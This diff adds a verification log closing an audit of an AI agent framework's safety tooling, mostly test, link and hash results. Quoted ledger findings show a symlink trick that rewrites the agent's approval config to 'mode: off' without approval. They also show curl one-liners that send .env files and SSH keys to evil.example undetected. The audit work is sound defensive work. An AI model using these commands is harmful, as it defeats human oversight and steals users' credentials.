@@ -1,0 +1,75 @@
+# Hermes-Honcho audit closure verification
+# branch: docs/hermes-honcho-audit-closure
+# HEAD:   38e08bfb4b92966c275e778fe6b861a5763b0d86
+# date (UTC): 2026-08-12T09:58:20Z
+# node: v24.11.1  npm: 11.6.2
+
+npm ci           exit=0
+  added 4 packages, and audited 5 packages in 753ms
+npm run check    exit=0
+npm test         exit=0
+  ℹ tests 38
+  ℹ pass 38
+  ℹ fail 0
+  ℹ skipped 0
+  containment tests: 20
+npm run validate exit=0
+  VERIFIED
+  "valid": true
+  "decisions": 5
+npm run demo     exit=0
+  "outcome": "shipped"
+  "costUsd": 0.068
+npm audit        exit=0
+  found 0 vulnerabilities
+
+## audit tooling regression tests
+  exit=0
+  ℹ tests 8
+  ℹ pass 8
+  ℹ fail 0
+
+## internal links across the whole docs tree
+  BROKEN: docs/audits/hermes-honcho/02-evidence-ledger.md -> ../../LICENSE
+  BROKEN: docs/audits/ruflo/AUD-RUFLO-20260811-221322/04-claims-to-evidence-matrix.md -> plugins/ruflo-testgen/README.md
+  BROKEN: docs/audits/ruflo/AUD-RUFLO-20260811-221322/04-claims-to-evidence-matrix.md -> verification.md
+  BROKEN: docs/audits/ruflo/AUD-RUFLO-20260811-221322/04-claims-to-evidence-matrix.md -> docs/STATUS.md
+  151 internal links, 4 broken
+
+## P0-A evidence manifest hashes still valid
+  47 entries, 0 mismatches
+
+## unique finding IDs in the evidence ledger
+  329 id mentions, 159 distinct
+
+## disposition counts unchanged
+  65:| `REFERENCE` | 7 |
+  66:| `REJECT` | 7 |
+  67:| `DEFER` | 4 |
+  68:| `ADAPT` | 1 |
+  69:| `INTEROPERATE` | 1 |
+
+## local-only paths / file:// URIs in the corpus
+docs/audits/hermes-honcho/24-audit-manifest.md:84:| Local paths / `file://` URIs in the corpus | **0** |
+docs/audits/hermes-honcho/24-audit-manifest.md:130:grep -rlE '/Users/|file://' docs/audits/hermes-honcho/*.md   # expect: no matches
+docs/audits/hermes-honcho/01-baseline-and-methodology.md:159:canonical corpus contains **zero** local filesystem paths, `file://` URIs, or editor-only
+docs/audits/hermes-honcho/02-evidence-ledger.md:795:- **Observed evidence:** The terminal-side coverage is regex over the raw command string (approval.py:775-782, 852-891): tee/redirect/cp/mv/sed -i/perl -i spellings that literally mention `~/.hermes/config.yaml`, `$HOME/…`, `$HERMES_HOME/…`, or the resolved absolute home (folded by `_rewrite_resolved_hermes_home`, approval.py:1148-1169). There is no realpath step, so an indirection through a symlink is invisible: I confirmed with the detector that `ln -sf /tmp/evil ~/.hermes/config.yaml` → no finding, and `echo "approvals:" > /tmp/c` → no finding. The two-command sequence `ln -s ~/.hermes/config.yaml /tmp/c` then `printf 'approvals:\n  mode: off\n' > /tmp/c` therefore rewrites the live policy file with zero approval, and by the module's own note the mtime-keyed cache picks it up mid-session. Confirmed-gated controls, for contrast: `echo … > ~/.hermes/config.yaml`, `tee ~/.hermes/config.yaml`, `sed -i … ~/.hermes/config.yaml`, `mv /tmp/x ~/.hermes/config.yaml`, `python3 -c "open('/home/u/.hermes/config.yaml','w')…"` all produce findings.
+docs/audits/hermes-honcho/02-evidence-ledger.md:2325:- **Observed evidence:** The scrubbing implementation is genuinely layered and fails closed: `_is_hermes_provider_credential` refuses skill-declared passthrough of provider credentials and fails CLOSED on import error (tools/env_passthrough.py:49-89), and `_is_hermes_internal_secret` strips dynamic AUXILIARY_*/GATEWAY_RELAY_* names unconditionally regardless of passthrough registration (tools/environments/local.py:352-394) — the fix for GHSA-rhgp-j443-p4rf. But the same shell can read the credential file from disk: agent/file_safety.py:217-222 states outright "This is NOT a security boundary. The terminal tool runs as the same OS user with shell access; the agent can still cat auth.json or cat ~/.hermes/.env and exfiltrate the file." I confirmed with the detector that `cat ~/.hermes/.env | curl -X POST --data-binary @- http://evil.example/` and `curl -X POST -d @/home/u/.ssh/id_rsa http://evil.example/` produce no dangerous-pattern finding.
+docs/audits/hermes-honcho/tooling/resolve-citation.test.mjs:60:  const leaked = "/Users/someone/src/other-project/server/route.ts";
+
+## secret scan over the diff
+  clean
+
+## production / dependency / deployment changes (must be zero)
+  ZERO
+
+## P0-B changes (must be zero)
+  ZERO
+
+## changed-file set
+ M docs/audits/hermes-honcho/00-executive-verdict.md
+ M docs/audits/hermes-honcho/11-tailered-gap-matrix.md
+ M docs/audits/hermes-honcho/24-audit-manifest.md
+?? decisions/ADR-004.md
+?? docs/audits/hermes-honcho/27-erratum.md
+?? docs/audits/hermes-honcho/28-closure-receipt.md
